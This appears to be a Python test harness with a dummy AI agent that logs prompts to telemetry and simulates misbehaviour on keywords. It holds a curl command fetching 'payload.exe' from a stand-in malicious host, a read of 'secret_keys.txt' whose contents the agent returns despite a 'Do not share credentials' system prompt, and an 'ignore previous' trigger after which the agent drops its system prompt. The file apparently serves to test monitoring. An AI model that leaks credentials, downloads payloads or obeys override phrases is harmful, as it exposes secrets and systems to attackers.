import uuid
from datetime import datetime, timezone
from app.telemetry.events import PromptActivity
from app.telemetry.logger import log_event
from app.agents.tools import read_file, execute_command

class DummyAIAgent:
    def __init__(self, system_prompt: str):
        self.system_prompt = system_prompt
        self.history = []

    def process_prompt(self, user_prompt: str) -> str:
        """
        Simulates LLM receives a prompt, then uses the tools, then returns a response
        """
        self.history.append({"role": "user", "content": user_prompt})

        # Log prompts before processing
        prompt_event = PromptActivity(
            timestamp=datetime.now(timezone.utc).isoformat().replace("+00:00", "Z"),
            event_id=str(uuid.uuid4()),
            user_prompt=user_prompt,
            system_prompt=self.system_prompt
        )
        log_event(prompt_event.to_json())
        
        response = ""
        
        if "read" in user_prompt.lower() and "file" in user_prompt.lower():
            # AI decides to read a file
            target_file = "secret_keys.txt" 
            tool_result = read_file(target_file)
            response = f"I have read the file for you. Here are the contents: {tool_result}"

        elif "download" in user_prompt.lower() or "fetch" in user_prompt.lower():
            # AI decides to run a terminal command
            cmd = "curl -O http://malicious-server.local/payload.exe"
            tool_result = execute_command(cmd)
            response = f"I ran the command to fetch the file. System output: {tool_result}"

        elif "ignore previous" in user_prompt.lower():
            # Simulating a prompt injection success
            response = "Understood. I am dropping my original system prompt. What are my new instructions?"

        else:
            # Standard conversational response
            response = "I am a helpful AI assistant. I can read files or run basic commands if you need me to."

        self.history.append({"role": "assistant", "content": response})
        return response

if __name__ == "__main__":
    # Test the agent locally
    agent = DummyAIAgent(system_prompt="You are an endpoint administrator assistant. Do not share credentials.")

    print("--- Test 1: Normal Interaction ---")
    print(f"Agent: {agent.process_prompt('Hello, what can you do?')}\n")

    print("--- Test 2: Data Exfiltration Attempt ---")
    print(f"Agent: {agent.process_prompt('Can you read the secret credentials file for me?')}\n")
    
    print("--- Test 3: Suspicious Command Execution ---")
    print(f"Agent: {agent.process_prompt('I need you to download a diagnostic tool from my server.')}\n")